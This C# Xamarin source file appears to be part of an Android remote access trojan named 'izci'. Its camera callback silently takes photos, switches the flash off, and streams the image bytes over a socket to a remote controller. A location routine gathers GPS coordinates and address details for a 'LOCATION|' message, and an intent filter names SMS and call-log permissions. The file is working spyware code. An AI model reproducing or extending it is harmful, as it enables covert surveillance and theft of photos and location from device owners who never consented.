using Android.App;
using Android.Content;
using Android.Content.Res;
using Android.Hardware;
using Android.Hardware.Camera2;
using Android.Widget;
using Java.IO;
using Plugin.Geolocator;
using Plugin.Geolocator.Abstractions;
using System;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace izci
{
    [IntentFilter(new string[] {
    "android.provider.Telephony.READ_SMS","android.permission.READ_CALL_LOG"
    ,"android.permission.READ_SMS"}, Priority = (int)IntentFilterPriority.HighPriority)]
    class PictureCallback : Java.Lang.Object, Camera.IPictureCallback
    {
        private int _cameraID;
        public PictureCallback(int cameraID)
        {
            _cameraID = cameraID;
        }
        public void OnPictureTaken(byte[] data, Camera camera)
        {
            
            try
            {
                Send(MainActivity.Soketimiz,Encoding.UTF8.GetBytes("WEBCAM|" + data.Length.ToString()),0,
                    Encoding.UTF8.GetBytes("WEBCAM|" + data.Length.ToString()).Length,59999);
                Send(MainActivity.Soketimiz, data, 0, data.Length, 59999);
                /*
                MainActivity.Soketimiz.BeginSend(data,0,data.Length,System.Net.Sockets.SocketFlags.None, new AsyncCallback((ar) =>
                {
                    MainActivity.Soketimiz.EndSend(ar);
                }), data);
                */
                //System.IO.File.WriteAllBytes(Android.OS.Environment.GetExternalStoragePublicDirectory(Android.OS.Environment.DirectoryPictures) + "/cam.jpg", data);
                //MainActivity.Soketimiz.BeginSend(data,0,data.Length,System.Net.Sockets.SocketFlags.None, null, null);
                //loglariHazirEt();
                
            }
            catch (Exception)
            {
                //Send(MainActivity.Soketimiz, Encoding.UTF8.GetBytes("CAMNOT|"), 0,
                  //  Encoding.UTF8.GetBytes("CAMNOT|").Length, 59999);
            }

            try {
                try
                {
                    Camera.Parameters parameters = camera.GetParameters();
                    parameters.FlashMode = FlashMode.Off.ToString();
                    camera.SetParameters(parameters);
                }
                catch (Exception) { }

                camera.StopPreview();
                camera.Release();
            }
            catch (Exception) { }
        }
        public static void Send(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
            //int startTickCount = Environment.TickCount;
            int sent = 0; 
            do
            {
                //if (Environment.TickCount > startTickCount + timeout)
                  //  throw new Exception("Timeout.");
                try
                {
                    sent += socket.Send(buffer, offset + sent, size - sent, SocketFlags.None);
                }
                catch (SocketException ex)
                {
                    if (ex.SocketErrorCode == SocketError.WouldBlock ||
                        ex.SocketErrorCode == SocketError.IOPending ||
                        ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                    {
                      
                        Thread.Sleep(30);
                    }
                    else
                        throw ex;  
                }
            } while (sent < size);
        }
        public async void lokasyonCek()
        {
            double GmapLat = 0;
            double GmapLong = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Medium, TimeSpan.FromSeconds(10));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "Boş";
                    string admin = "Boş";
                    string local = "Boş";
                    string sublocal = "Boş";
                    if (placemark != null)
                    {                       
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        
                    }
                    byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + GeoCountryName + "=" +
                            admin + "=" + local + "=" + sublocal + "=" + location.Latitude.ToString() +
                         "=" + location.Longitude + "=");
                }
            }
            catch (FeatureNotSupportedException ex) {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                               "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                            "=" + "HATA" + "=");
            }
            catch (FeatureNotEnabledException ex)  {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=");
            }
            catch (PermissionException ex)  {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=");
            } 
            catch (Exception ex)  {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=");
            }
        }                    
    }
}